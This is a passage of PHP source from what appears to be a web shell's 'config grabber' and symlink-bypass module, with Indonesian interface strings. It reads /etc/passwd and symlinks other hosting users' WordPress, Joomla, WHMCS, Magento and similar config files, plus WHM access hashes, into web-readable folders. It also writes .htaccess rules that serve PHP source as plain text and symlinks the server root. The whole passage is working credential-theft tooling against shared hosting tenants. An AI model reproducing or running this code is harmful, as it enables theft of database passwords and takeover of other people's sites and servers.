			$grab_config = array(
							"/home/$users/.accesshash" => "WHM-accesshash",
							"/home/$users/public_html/config/koneksi.php" => "Lokomedia",
							"/home/$users/public_html/forum/config.php" => "phpBB",
							"/home/$users/public_html/sites/default/settings.php" => "Drupal",
							"/home/$users/public_html/config/settings.inc.php" => "PrestaShop",
							"/home/$users/public_html/app/etc/local.xml" => "Magento",
							"/home/$users/public_html/admin/config.php" => "OpenCart",
							"/home/$users/public_html/application/config/database.php" => "Ellislab",
							"/home/$users/public_html/vb/includes/config.php" => "Vbulletin",
							"/home/$users/public_html/includes/config.php" => "Vbulletin",
							"/home/$users/public_html/forum/includes/config.php" => "Vbulletin",
							"/home/$users/public_html/forums/includes/config.php" => "Vbulletin",
							"/home/$users/public_html/cc/includes/config.php" => "Vbulletin",
							"/home/$users/public_html/inc/config.php" => "MyBB",
							"/home/$users/public_html/includes/configure.php" => "OsCommerce",
							"/home/$users/public_html/shop/includes/configure.php" => "OsCommerce",
							"/home/$users/public_html/os/includes/configure.php" => "OsCommerce",
							"/home/$users/public_html/oscom/includes/configure.php" => "OsCommerce",
							"/home/$users/public_html/products/includes/configure.php" => "OsCommerce",
							"/home/$users/public_html/cart/includes/configure.php" => "OsCommerce",
							"/home/$users/public_html/inc/conf_global.php" => "IPB",
							"/home/$users/public_html/wp-config.php" => "Wordpress",
							"/home/$users/public_html/wp/test/wp-config.php" => "Wordpress",
							"/home/$users/public_html/blog/wp-config.php" => "Wordpress",
							"/home/$users/public_html/beta/wp-config.php" => "Wordpress",
							"/home/$users/public_html/portal/wp-config.php" => "Wordpress",
							"/home/$users/public_html/site/wp-config.php" => "Wordpress",
							"/home/$users/public_html/wp/wp-config.php" => "Wordpress",
							"/home/$users/public_html/WP/wp-config.php" => "Wordpress",
							"/home/$users/public_html/news/wp-config.php" => "Wordpress",
							"/home/$users/public_html/wordpress/wp-config.php" => "Wordpress",
							"/home/$users/public_html/test/wp-config.php" => "Wordpress",
							"/home/$users/public_html/demo/wp-config.php" => "Wordpress",
							"/home/$users/public_html/home/wp-config.php" => "Wordpress",
							"/home/$users/public_html/v1/wp-config.php" => "Wordpress",
							"/home/$users/public_html/v2/wp-config.php" => "Wordpress",
							"/home/$users/public_html/press/wp-config.php" => "Wordpress",
							"/home/$users/public_html/new/wp-config.php" => "Wordpress",
							"/home/$users/public_html/blogs/wp-config.php" => "Wordpress",
							"/home/$users/public_html/configuration.php" => "Joomla",
							"/home/$users/public_html/blog/configuration.php" => "Joomla",
							"/home/$users/public_html/submitticket.php" => "^WHMCS",
							"/home/$users/public_html/cms/configuration.php" => "Joomla",
							"/home/$users/public_html/beta/configuration.php" => "Joomla",
							"/home/$users/public_html/portal/configuration.php" => "Joomla",
							"/home/$users/public_html/site/configuration.php" => "Joomla",
							"/home/$users/public_html/main/configuration.php" => "Joomla",
							"/home/$users/public_html/home/configuration.php" => "Joomla",
							"/home/$users/public_html/demo/configuration.php" => "Joomla",
							"/home/$users/public_html/test/configuration.php" => "Joomla",
							"/home/$users/public_html/v1/configuration.php" => "Joomla",
							"/home/$users/public_html/v2/configuration.php" => "Joomla",
							"/home/$users/public_html/joomla/configuration.php" => "Joomla",
							"/home/$users/public_html/new/configuration.php" => "Joomla",
							"/home/$users/public_html/WHMCS/submitticket.php" => "WHMCS",
							"/home/$users/public_html/whmcs1/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Whmcs/submitticket.php" => "WHMCS",
							"/home/$users/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$users/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$users/public_html/WHMC/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Whmc/submitticket.php" => "WHMCS",
							"/home/$users/public_html/whmc/submitticket.php" => "WHMCS",
							"/home/$users/public_html/WHM/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Whm/submitticket.php" => "WHMCS",
							"/home/$users/public_html/whm/submitticket.php" => "WHMCS",
							"/home/$users/public_html/HOST/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Host/submitticket.php" => "WHMCS",
							"/home/$users/public_html/host/submitticket.php" => "WHMCS",
							"/home/$users/public_html/SUPPORTES/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Supportes/submitticket.php" => "WHMCS",
							"/home/$users/public_html/supportes/submitticket.php" => "WHMCS",
							"/home/$users/public_html/domains/submitticket.php" => "WHMCS",
							"/home/$users/public_html/domain/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Hosting/submitticket.php" => "WHMCS",
							"/home/$users/public_html/HOSTING/submitticket.php" => "WHMCS",
							"/home/$users/public_html/hosting/submitticket.php" => "WHMCS",
							"/home/$users/public_html/CART/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Cart/submitticket.php" => "WHMCS",
							"/home/$users/public_html/cart/submitticket.php" => "WHMCS",
							"/home/$users/public_html/ORDER/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Order/submitticket.php" => "WHMCS",
							"/home/$users/public_html/order/submitticket.php" => "WHMCS",
							"/home/$users/public_html/CLIENT/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Client/submitticket.php" => "WHMCS",
							"/home/$users/public_html/client/submitticket.php" => "WHMCS",
							"/home/$users/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Clientarea/submitticket.php" => "WHMCS",
							"/home/$users/public_html/clientarea/submitticket.php" => "WHMCS",
							"/home/$users/public_html/SUPPORT/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Support/submitticket.php" => "WHMCS",
							"/home/$users/public_html/support/submitticket.php" => "WHMCS",
							"/home/$users/public_html/BILLING/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Billing/submitticket.php" => "WHMCS",
							"/home/$users/public_html/billing/submitticket.php" => "WHMCS",
							"/home/$users/public_html/BUY/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Buy/submitticket.php" => "WHMCS",
							"/home/$users/public_html/buy/submitticket.php" => "WHMCS",
							"/home/$users/public_html/MANAGE/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Manage/submitticket.php" => "WHMCS",
							"/home/$users/public_html/manage/submitticket.php" => "WHMCS",
							"/home/$users/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"/home/$users/public_html/ClientSupport/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Clientsupport/submitticket.php" => "WHMCS",
							"/home/$users/public_html/clientsupport/submitticket.php" => "WHMCS",
							"/home/$users/public_html/CHECKOUT/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Checkout/submitticket.php" => "WHMCS",
							"/home/$users/public_html/checkout/submitticket.php" => "WHMCS",
							"/home/$users/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$users/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$users/public_html/BASKET/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Basket/submitticket.php" => "WHMCS",
							"/home/$users/public_html/basket/submitticket.php" => "WHMCS",
							"/home/$users/public_html/SECURE/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Secure/submitticket.php" => "WHMCS",
							"/home/$users/public_html/secure/submitticket.php" => "WHMCS",
							"/home/$users/public_html/SALES/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Sales/submitticket.php" => "WHMCS",
							"/home/$users/public_html/sales/submitticket.php" => "WHMCS",
							"/home/$users/public_html/BILL/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Bill/submitticket.php" => "WHMCS",
							"/home/$users/public_html/bill/submitticket.php" => "WHMCS",
							"/home/$users/public_html/PURCHASE/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Purchase/submitticket.php" => "WHMCS",
							"/home/$users/public_html/purchase/submitticket.php" => "WHMCS",
							"/home/$users/public_html/ACCOUNT/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Account/submitticket.php" => "WHMCS",
							"/home/$users/public_html/account/submitticket.php" => "WHMCS",
							"/home/$users/public_html/USER/submitticket.php" => "WHMCS",
							"/home/$users/public_html/User/submitticket.php" => "WHMCS",
							"/home/$users/public_html/user/submitticket.php" => "WHMCS",
							"/home/$users/public_html/CLIENTS/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Clients/submitticket.php" => "WHMCS",
							"/home/$users/public_html/clients/submitticket.php" => "WHMCS",
							"/home/$users/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$users/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$users/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$users/public_html/MY/submitticket.php" => "WHMCS",
							"/home/$users/public_html/My/submitticket.php" => "WHMCS",
							"/home/$users/public_html/my/submitticket.php" => "WHMCS",
							"/home/$users/public_html/secure/whm/submitticket.php" => "WHMCS",
							"/home/$users/public_html/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$users/public_html/panel/submitticket.php" => "WHMCS",
							"/home/$users/public_html/clientes/submitticket.php" => "WHMCS",
							"/home/$users/public_html/cliente/submitticket.php" => "WHMCS",
							"/home/$users/public_html/support/order/submitticket.php" => "WHMCS",
							"/home/$users/public_html/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/box/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/host/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/Host/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/supportes/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/support/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/hosting/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/cart/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/order/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/client/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/clients/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/cliente/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/clientes/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/billing/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/billings/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/my/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/secure/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/support/order/bb-config.php" => "BoxBilling",
							"/home/$users/public_html/includes/dist-configure.php" => "Zencart",
							"/home/$users/public_html/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$users/public_html/products/includes/dist-configure.php" => "Zencart",
							"/home/$users/public_html/cart/includes/dist-configure.php" => "Zencart",
							"/home/$users/public_html/shop/includes/dist-configure.php" => "Zencart",
							"/home/$users/public_html/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/hostbills/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/host/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/Host/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/supportes/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/support/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/hosting/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/cart/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/order/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/client/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/clients/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/cliente/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/clientes/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/billing/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/billings/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/my/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/secure/includes/iso4217.php" => "Hostbills",
							"/home/$users/public_html/support/order/includes/iso4217.php" => "Hostbills"
			);
			
			foreach ($grab_config as $config => $nama_config) {
				system("ln -s ".$config." xnxxxxx/".$users."-".$nama_config.".txt");
				symlink($config,"xnxxxxx/".$users."-".$nama_config.".txt");
				
				$inija = fopen("xnxxxxx/.htaccess", "w");
				fwrite($inija,"ReadmeName ".$users."-".$nama_config.".txt
					Options Indexes FollowSymLinks
					DirectoryIndex ngeue.htm
					AddType text/plain .php
					AddHandler text/plain .php
					Satisfy Any
				");
			}
		}
		echo '<center><br><a href="xnxxxxx/" target="_blank">Klik Gan >:(</a><br><br>';
	} else {
		echo "<center><form method=\"post\" action=\"\"><center>
		</center></select><br><textarea class=\"txarea\" name=\"passwd\" style=\"height: 450px;width: 100%;resize: none;\">";
		echo getpasswd();
		echo "</textarea>";
		echo "<br><br><input type=\"submit\" name=\"bypass\" value=\"Bypass!!\"></center><br>";
	}
}
elseif($_GET['config'] == 'grabber') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
if($_POST){	if($_POST['config'] == 'symvhosts') {
@mkdir("brudul_symvhosts", 0777);
exe("ln -s / brudul_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("brudul_symvhosts/.htaccess",$htaccess);
$etc_passwd=$_POST['passwd'];

$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php brudul_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php brudul_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php brudul_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php brudul_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php brudul_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php brudul_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml brudul_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php brudul_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php brudul_symvhosts/".$jembod."-Ellislab.txt");
}}}
if($_POST['config'] == 'symlink') {
@mkdir("brudul_symconfig", 0777);
@symlink("/","brudul_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("brudul_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("brudul_sym404", 0777);
@symlink("/","brudul_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
AddIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' ^^DIRECTORY^^
DefaultIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*brudul_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("brudul_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
mkdir("brudul_configgrab", 0777);
$isi_htc = "Options all\nRequire None\nSatisfy Any";
$htc = fopen("brudul_configgrab/.htaccess","w");
fwrite($htc, $isi_htc);
}
$passwd = $_POST['passwd'];
preg_match_all('/(.*?):x:/', $passwd, $user_config);
// $user_config = explode(':', $passwd);
foreach($user_config[1] as $user_brudul) {
$grab_config = array(
"/home/$user_brudul/.accesshash" => "WHM-accesshash",
"/home/$user_brudul/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_brudul/public_html/forum/config.php" => "phpBB",
"/home/$user_brudul/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_brudul/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_brudul/public_html/app/etc/local.xml" => "Magento",
"/home/$user_brudul/public_html/admin/config.php" => "OpenCart",
"/home/$user_brudul/public_html/application/config/database.php" => "Ellislab",
"/home/$user_brudul/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/inc/config.php" => "MyBB",
"/home/$user_brudul/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/inc/conf_global.php" => "IPB",
"/home/$user_brudul/public_html/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/blog/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/submitticket.php" => "^WHMCS",
"/home/$user_brudul/public_html/cms/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/beta/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/portal/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/site/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/main/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/home/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/demo/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/test/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/v1/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/v2/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/new/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/secure/bb-config.php" => "BoxBilling",
